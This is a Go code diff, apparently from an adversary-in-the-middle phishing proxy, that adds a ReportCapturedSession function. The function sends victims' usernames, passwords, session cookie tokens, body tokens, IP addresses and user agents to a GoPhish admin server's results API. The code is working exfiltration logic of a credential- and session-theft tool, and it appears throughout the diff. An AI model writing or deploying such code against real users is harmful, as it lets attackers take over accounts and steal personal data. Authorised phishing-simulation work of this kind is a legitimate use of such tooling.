@@ -104,14 +104,52 @@ func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session, gophi
 
 	data := make(map[string]interface{})
 	if gophishSessions {
-		data["username"] = session.Username
-		data["password"] = session.Password
-		if len(session.CookieTokens) != 0 {
-			data["cookies"] = (*Terminal).cookieTokensToJSON(nil, session.CookieTokens)
+		if session.Username != "" {
+			data["username"] = session.Username
 		}
-
+		if session.Password != "" {
+			data["password"] = session.Password
+		}
 		for k, v := range session.Custom {
 			data[k] = v
+		}
+	}
+
+	req := ResultRequest{
+		Address:   session.RemoteAddr,
+		UserAgent: session.UserAgent,
+		Data:      data,
+	}
+
+	content, err := json.Marshal(req)
+	if err != nil {
+		return err
+	}
+
+	var reqUrl url.URL = *o.AdminUrl
+	reqUrl.Path = fmt.Sprintf("/api/results/%s/submit", rid)
+	return o.apiRequest(reqUrl.String(), content)
+}
+
+func (o *GoPhish) ReportCapturedSession(rid string, session *Session, gophishSessions bool) error {
+	err := o.validateSetup()
+	if err != nil {
+		return err
+	}
+
+	data := make(map[string]interface{})
+	if gophishSessions {
+		if session.Username != "" {
+			data["username"] = session.Username
+		}
+		if session.Password != "" {
+			data["password"] = session.Password
+		}
+		for k, v := range session.Custom {
+			data[k] = v
+		}
+		if len(session.CookieTokens) != 0 {
+			data["cookies"] = (*Terminal).cookieTokensToJSON(nil, session.CookieTokens)
 		}
 		for k, v := range session.BodyTokens {
 			data[k] = v
@@ -133,7 +171,7 @@ func (o *GoPhish) ReportCredentialsSubmitted(rid string, session *Session, gophi
 	}
 
 	var reqUrl url.URL = *o.AdminUrl
-	reqUrl.Path = fmt.Sprintf("/api/results/%s/submit", rid)
+	reqUrl.Path = fmt.Sprintf("/api/results/%s/session", rid)
 	return o.apiRequest(reqUrl.String(), content)
 }
 
